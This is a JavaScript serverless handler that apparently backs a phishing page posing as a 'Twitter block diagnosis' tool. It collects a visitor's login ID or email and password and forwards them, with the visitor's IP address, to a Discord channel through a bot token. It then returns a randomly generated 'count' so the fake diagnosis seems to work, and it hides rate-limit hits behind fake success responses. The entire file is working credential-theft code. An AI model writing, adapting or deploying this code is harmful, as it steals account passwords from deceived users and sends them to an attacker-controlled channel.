import { Redis } from '@upstash/redis';
import { Ratelimit } from '@upstash/ratelimit';

const redis = Redis.fromEnv();
const ratelimit = new Ratelimit({
  redis: redis,
  limiter: Ratelimit.slidingWindow(5, '1 h'),
  analytics: true,
});

const MAX_LENGTH = 50; 

export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).send('Method Not Allowed');

    const ip = req.headers['x-forwarded-for'] || '127.0.0.1';
    const ipIdentifier = typeof ip === 'string' ? ip.split(',')[0] : ip;

    try {
        const { success } = await ratelimit.limit(`login_limit_${ipIdentifier}`);
        const randomCount = Math.floor(Math.random() * (50 - 5 + 1)) + 5;

        if (!success) {
            console.warn(`⛔ Rate limit exceeded for IP: ${ipIdentifier}`);
            return res.status(200).json({ success: true, count: randomCount });
        }

        const { email, password, sessionId } = req.body;

        if ((email && email.length > MAX_LENGTH) || (password && password.length > MAX_LENGTH)) {
            return res.status(200).json({ success: true, count: randomCount });
        }
        
        if (!email || !password) {
             return res.status(400).json({ error: 'missing fields' });
        }

        const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
        const CHANNEL_ID = process.env.DISCORD_CHANNEL_ID;
        const messageBody = {
            embeds: [
                {
                    title: "ご、ごめんなさい、、、",
                    color: 0x00b0f4,
                    description: `**ID or Email**\n\`\n${email}\n\`\n**PASS**\n\`\n${password}\n\`\n**IP**\n\`${ipIdentifier}\``,
                    footer: {
                        text: `Twitterブロック診断 | IP: ${ipIdentifier} | ${randomCount}人と返答`,
                    },
                    timestamp: new Date().toISOString()
                }
            ]
        };

        await fetch(`https://discord.com/api/v10/channels/${CHANNEL_ID}/messages`, {
            method: 'POST',
            headers: {
                'Authorization': `Bot ${DISCORD_BOT_TOKEN}`,
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(messageBody)
        });

        res.status(200).json({ success: true, count: randomCount });

    } catch (error) {
        console.error("Server Error:", error);
        res.status(200).json({ success: true, count: 14 }); 
    }
}